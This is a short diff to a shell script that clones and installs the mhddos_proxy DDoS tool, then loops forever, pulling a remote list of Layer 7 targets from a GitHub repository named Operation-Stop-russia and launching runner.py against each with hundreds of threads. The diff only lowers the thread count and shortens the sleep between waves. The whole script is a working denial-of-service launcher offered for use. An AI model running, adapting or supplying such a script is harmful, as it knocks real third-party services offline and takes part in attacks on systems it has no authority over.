@@ -5,7 +5,7 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
-threads="${1:-1000}"; threads="-t $threads"
+threads="${1:-900}"; threads="-t $threads"
 rpc="--rpc 1000"
 debug="--debug"
 
@@ -23,5 +23,5 @@ do
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Operation-Stop-russia/targets_lists/main/L7m.lst | cat | grep "^[^#]")")
             python3 ~/mhddos_proxy/runner.py $cmd_line $threads $rpc $debug&
       done
-sleep 15m
+sleep 10m
 done
